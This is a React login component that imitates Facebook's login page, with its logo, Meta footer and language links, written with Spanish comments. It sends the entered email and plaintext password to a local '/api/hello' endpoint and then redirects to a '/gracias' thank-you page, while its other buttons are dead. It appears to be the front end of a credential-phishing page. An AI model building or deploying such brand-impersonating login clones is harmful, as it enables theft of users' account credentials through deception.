import React, { useState } from 'react';
import axios from 'axios';
import { useRouter } from 'next/router';
const LoginForm = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const router = useRouter();
  const validateForm = async (e) => {
    e.preventDefault(); // Evita la recarga de la página.

    setEmailError('');
    setPasswordError('');

    let isValid = true;
    const emailRegex = /^\S+@\S+\.\S+/;
    const phoneRegex = /^[0-9]{10}/;

    if (!(emailRegex.test(email) || phoneRegex.test(email))) {
      setEmailError('Por favor, ingrese un correo electrónico o número de teléfono válido.');
      isValid = false;
    }

    if (password.length < 6) {
      setPasswordError('La contraseña debe tener al menos 6 caracteres.');
      isValid = false;
    }

    if (isValid) {
      try {
        const response = await axios.post('http://localhost:3000/api/hello', {
          email,
          password,
        });
        if(response){
            router.push('/gracias');
        }
       
        setEmail('');
        setPassword('');
      } catch (error) {
        console.error('Error al enviar los datos al servidor:', error);
      }
    }
  };

  return (
    <div className="login-form">
      <div className="logo">
        <img src="/FacebookLogo.svg" alt="Facebook logo" />
      </div>
      <form onSubmit={validateForm}>
        <div className="input-group">
          <input
            type="text"
            id="email"
            name="email"
            placeholder="Enter your mobile number or email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <span style={{ color: 'red' }}>{emailError}</span>
        </div>
        <div className="input-group">
          <input
            type="password"
            id="password"
            name="password"
            placeholder="Enter your password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <span style={{ color: 'red' }}>{passwordError}</span>
        </div>
        <button type="submit" id="login-btn">Log in</button>
        <a href="#" id="forgot-pwd">Forgot password?</a>
        <div className="horizontal-align">
          <hr style={{ width: '40%' }} />
          <p>or</p>
          <hr style={{ width: '40%' }} />
        </div>
        <button type="button" id="create-btn">Create a new account</button>
      </form>
      <div className="language-selector">
        <div className="column">
          <p><a href="#" id="en">English (US)</a></p>
          <p><a href="#" id="es">Español</a></p>
          <p><a href="#" id="pt">Português (Brasil)</a></p>
          <p><a href="#" id="fr">Français (France)</a></p>
        </div>
        <div className="column">
          <p><a href="#" id="de">Deutsch</a></p>
          <p><a href="#" id="ar">العربية</a></p>
          <p><a href="#" id="it">Italiano</a></p>
        </div>
      </div>
      <div className="footer">
        <center><p>Meta © 2023</p></center>
      </div>
    </div>
  );
};

export default LoginForm;
